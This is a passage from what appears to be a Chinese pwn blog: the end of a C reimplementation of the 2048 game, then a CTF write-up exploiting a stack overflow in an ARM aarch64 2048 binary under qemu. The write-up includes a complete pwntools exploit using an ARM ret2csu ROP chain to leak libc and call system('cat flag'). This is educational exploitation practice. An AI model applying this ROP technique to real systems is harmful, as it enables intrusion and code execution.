&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_right</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">2</span>,k=<span class="number">3</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[i][k]==box[i][j])&#123;</span><br><span class="line">					box[i][k]++;</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[i][k]]);</span><br><span class="line">					k--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[i][k]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[i][k]=box[i][j];</span><br><span class="line">					box[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[i][--k]=box[i][j];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_up</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>,k=<span class="number">0</span>;j&lt;<span class="number">4</span>;++j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[j][i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[k][i]==box[j][i])&#123;</span><br><span class="line">					box[k][i]++;</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[k][i]]);</span><br><span class="line">					k++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[k][i]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[k][i]=box[j][i];</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[++k][i]=box[j][i];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[j][i]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_down</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">2</span>,k=<span class="number">3</span>;j&gt;=<span class="number">0</span>;--j)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[j][i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(box[k][i]==box[j][i])&#123;</span><br><span class="line">					box[k][i]++;</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">					table_check(key[box[k][i]]);</span><br><span class="line">					k--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(box[k][i]==<span class="number">0</span>)&#123;</span><br><span class="line">					box[k][i]=box[j][i];</span><br><span class="line">					box[j][i]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					box[--k][i]=box[j][i];</span><br><span class="line">					<span class="keyword">if</span>(j!=k)&#123;</span><br><span class="line">						box[j][i]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">game</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> input;</span><br><span class="line">	table_init();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		extra = <span class="number">0</span>;</span><br><span class="line">		input = <span class="number">0</span>;</span><br><span class="line">		input = getchar();</span><br><span class="line">		randomly_add();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(input == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">			move_up();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;s&#x27;</span>)&#123;</span><br><span class="line">			move_down();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">			move_left();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(input == <span class="string">&#x27;d&#x27;</span>)&#123;</span><br><span class="line">			move_right();</span><br><span class="line">		&#125;</span><br><span class="line">		table_show();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(win==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;You are win~~,Thanks for your playing~~~\n&quot;</span>);</span><br><span class="line">			getchar();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	tcgetattr(<span class="number">0</span>,&amp;old_config);</span><br><span class="line">	new_config = old_config;</span><br><span class="line">	new_config.c_lflag &amp;= ~ICANON;         </span><br><span class="line">	new_config.c_lflag &amp;= ~ECHO;        </span><br><span class="line">	new_config.c_cc[VMIN] = <span class="number">1</span>;          </span><br><span class="line">	new_config.c_cc[VTIME] = <span class="number">0</span>; </span><br><span class="line">	tcsetattr(<span class="number">0</span>, TCSANOW, &amp;new_config);</span><br><span class="line">	game();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关于几个 move 的操作参考了网上的代码</li>
<li>而关于 game loss 的判断则没有写（IDA 太乱了）</li>
</ul>
<p>运行效果如下：</p>
<img src="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/1661929880953.png" class width="1661929880953"> 
<img src="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/1661929926875.png" class width="1661929926875"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/30/ARM%20pwn+ret2csu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/30/ARM%20pwn+ret2csu/" class="post-title-link" itemprop="url">ARM pwn+ret2csu</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-30 15:39:56 / Modified: 15:41:30" itemprop="dateCreated datePublished" datetime="2022-08-30T15:39:56+08:00">2022-08-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>2048 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：ARM 的 libc 和 X86 的还不一样</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2048</span>: ELF <span class="number">64</span>-bit LSB executable, ARM aarch64, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so<span class="number">.1</span>, BuildID[sha1]=<span class="number">2</span>ad2206f21bc8a991f4874f2b2ca0cc6e6b973c0, <span class="keyword">for</span> GNU/Linux <span class="number">3.7</span><span class="number">.0</span>, stripped                  </span><br><span class="line">    Arch:     aarch64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，ARM，开了 NX，Full RELRO</li>
</ul>
<p>这是 ARM 的程序，需要用 qemu 来模拟 ARM 虚拟机（环境我已经搭好了）</p>
<p>使用如下命令来启动 qemu：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn]</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>]; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Do you want to continue playing? [y/n]: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);                       <span class="comment">// 栈溢出</span></span><br><span class="line">result = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> || buf[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> game_close();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<ul>
<li>数组 buf 溢出，没有开 canary 可以直接打 ROP</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>在进行栈溢出之前，需要先完成一个游戏：2048</p>
<ul>
<li>B站学习视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Er4y1M7H6?spm_id_from=333.337.search-card.all.click&amp;vd_source=e57d5ad6d12068c1395d17b2d54c58d1">怎么玩2048_bilibili</a></li>
<li>在 github 上寻找 2048 的自动化脚本：<a target="_blank" rel="noopener" href="https://github.com/SrinidhiRaghavan/AI-2048-Puzzle">SrinidhiRaghavan/AI-2048-Puzzle</a></li>
</ul>
<p>逆向分析发现，这个程序通过 “W” “S” “A” “D” 4个键来控制程序（具体的实现过程可以先不用管），并且程序的种子是固定的</p>
<p>每一局游戏都是以下这个界面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Score: <span class="number">0</span></span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |    <span class="number">2</span> |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|    <span class="number">2</span> |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">|      |      |      |      |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure>
<ul>
<li>因此，只要完成一次游戏记录 payload 就可以了（我就没有跑脚本了，直接硬玩也可以）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接下来的 ROP 就是重头戏了，先介绍一下 ARM 的 ret2csu：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020D8                              ; CODE XREF: sub_402070+<span class="number">3</span>C↑j</span><br><span class="line">.text: F3 <span class="number">53</span> <span class="number">41</span> A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text: F5 <span class="number">5B</span> <span class="number">42</span> A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text: F7 <span class="number">63</span> <span class="number">43</span> A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text: FD <span class="number">7B</span> C4 A8                   LDP             X29, X30, [SP+var_s0],#<span class="number">0x40</span></span><br><span class="line">.text: C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:                               loc_4020B8                              ; CODE XREF: sub_402070+<span class="number">64</span>↓j</span><br><span class="line">.text: A3 <span class="number">7</span>A <span class="number">73</span> F8                   LDR             X3, [X21,X19,LSL#<span class="number">3</span>]</span><br><span class="line">.text: E2 <span class="number">03</span> <span class="number">18</span> AA                   MOV             X2, X24</span><br><span class="line">.text: <span class="number">73</span> <span class="number">06</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X19, X19, #<span class="number">1</span></span><br><span class="line">.text: E1 <span class="number">03</span> <span class="number">17</span> AA                   MOV             X1, X23</span><br><span class="line">.text: E0 <span class="number">03</span> <span class="number">16</span> <span class="number">2</span>A                   MOV             W0, W22</span><br><span class="line">.text: <span class="number">60</span> <span class="number">00</span> <span class="number">3F</span> D6                   BLR             X3</span><br></pre></td></tr></table></figure>
<ul>
<li><code>LDP &lt;reg0&gt;, &lt;reg1&gt;, [&lt;reg2|SP&gt;&#123;, #&lt;imm&gt;&#125;]</code>：<ul>
<li>把 <code>SP+&lt;imm&gt;</code>上的值存入<code>&lt;reg0&gt;, &lt;reg1&gt;</code></li>
<li>常用于恢复寄存器的数据</li>
<li>基地址偏移量模式，“{}”大括号表示可选的意思</li>
</ul>
</li>
<li><code>LDR &lt;reg0&gt;, [&lt;reg1&gt;, &lt;reg2&gt;, LSL#3]</code>：<ul>
<li>查找到 <code>&lt;reg1&gt;</code>（基地址）加上 <code>&lt;reg2&gt;</code> 右移3位（偏移地址）的地址</li>
<li>把其中的内容赋值给 <code>&lt;reg0&gt;</code></li>
</ul>
</li>
<li><code>BLR &lt;Xm&gt;</code>：<ul>
<li>跳转到由 <code>&lt;Xm&gt;</code> 目标寄存器指定的地址处</li>
<li>同时将下一条指令存放到 <code>&lt;X30&gt;</code> 寄存器中 </li>
</ul>
</li>
</ul>
<p>利用模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">csu1_addr = </span><br><span class="line">csu2_addr = </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>) <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr) <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0) <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1) <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2) <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：程序并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
</ul>
<p>最后说一下 ARM 环境的问题：</p>
<ul>
<li>绝大多数 <code>ARM</code> 架构的题都是在 <code>qemu</code> 模拟出的环境中跑的，而 <code>qemu</code> 没有 <code>NX</code> 和 <code>PIE</code>（即使题目所给的二进制文件开了 <code>NX</code> 和 <code>PIE</code> 保护，也只是对真机环境奏效），也就是说，<code>qemu</code> 中所有地址都是有可执行权限的（包括堆栈，甚至 <code>bss</code> 段等），然后 <code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
<li>跑 <code>qemu</code> 的时候，<code>libc_base</code> 一般都是 <code>0x4000XXX000</code> 这样的地址，因此泄露数据的时候会被 <code>\x00</code> 截断，其实只需要泄露后三个字节（后六位），然后加上 <code>0x4000000000</code> 即可得到泄露出的 <code>libc</code> 地址（本地和远程的偏移可能不同）</li>
</ul>
<p>于是我们就先调用 GOT 里面的 <code>puts</code> 随便泄露一个 GOT 里面的函数，计算出 <code>libc_base</code>，然后利用 ret2csu 执行 ROP</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./20481&#x27;</span>])</span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./20481&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./20481&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x4020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x4020B8</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x04020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x04020B8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr)  <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0)  <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="number">0x4131B8</span></span><br><span class="line">__libc_start_main_got = <span class="number">0x412f68</span></span><br><span class="line">__libc_start_main_libc = <span class="number">0x5500856ba8</span></span><br><span class="line">puts_got = <span class="number">0x412f88</span></span><br><span class="line">libc_base = __libc_start_main_libc - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.send(p64(system_libc)+<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[y/n]: &#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(puts_got,__libc_start_main_got,0,0)</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(0x413154,(libc.search(&#x27;/bin/sh&#x27;).next())+libc_base,0,0)</span></span><br><span class="line">payload+=ret2csu(<span class="number">0x413154</span>,<span class="number">0x413154</span>+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;Bye~\n&#x27;)</span></span><br><span class="line"><span class="string">leak_addr=u64(p.recv(3).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">success(&quot;leak_addr &gt;&gt; &quot;+hex(leak_addr))</span></span><br><span class="line"><span class="string"># leak_addr &gt;&gt; 0x856ba8</span></span><br><span class="line"><span class="string"># __libc_start_main &gt;&gt; 0x5500856ba8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>初入 ARM pwn，学到了不少 ARM 的知识：</p>
<ul>
<li><code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
<li><code>ret2csu</code> 并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
</ul>
<p>我感觉这个 2048 小游戏很有意思，有时间看看这是这么实现的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
